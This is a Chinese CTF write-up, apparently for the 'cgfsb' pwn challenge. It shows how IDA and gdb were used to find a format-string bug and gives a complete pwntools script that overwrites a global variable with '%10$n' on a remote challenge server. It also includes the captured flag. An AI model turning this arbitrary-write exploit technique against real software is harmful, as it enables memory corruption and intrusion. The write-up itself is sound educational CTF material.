![1558938286420](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1558938286420.png)

nc到服务器题目上，输入什么，就输出什么

![1558938707032](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1558938707032.png)

通过 ida 查看汇编代码 找到`call printf`的地址（调用printf(&s)）。之后我们用gdb进行调试，在调用printf(&s)之前下一个断点,查看接收 message 的变量 s 是格式化字符串的第几个参数。输入 message 的时候输入 ‘aaaa’。

![1558939085275](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1558939085275.png)

![1558939300328](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1558939300328.png)

查看当前栈中的内容

![1558939333121](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1558939333121.png)

通过 输入message的时候，把 pwnme的地址（在ida中点击伪代码中的pwnme就能查看到了） 写到这个位置，然后把这个地址的值修改成8（利用格式化字符串漏洞的任意内存写）

![1558939497652](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1558939497652.png)

pwnme的地址+aaaa 凑出8个字节，这样就可以在10$的位置 写入8（四个字节）改变pwnme的值。

构造出下面的payload

```python
from pwn import *

context.log_level = 'debug' 

DEBUG = int(sys.argv[1])

if DEBUG == 1: 
    p = process('./cgfsb') 
else: 
    p = remote('111.198.29.45', 45121)

pwnme_addr = 0x0804A068

payload1 = "ABCD" 

payload2 = p32(pwnme_addr) + 'aaaa%10$n'

p.recvuntil('please tell me your name:\n') p.sendline(payload1)

p.recvuntil('leave your message please:\n') p.sendline(payload2)

print p.recv() 

print p.recv()

```



![1558940090825](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\1558940090825.png)

```
cyberpeace{b19ef6e1549c3976ca39c5ca49c824f7}
```

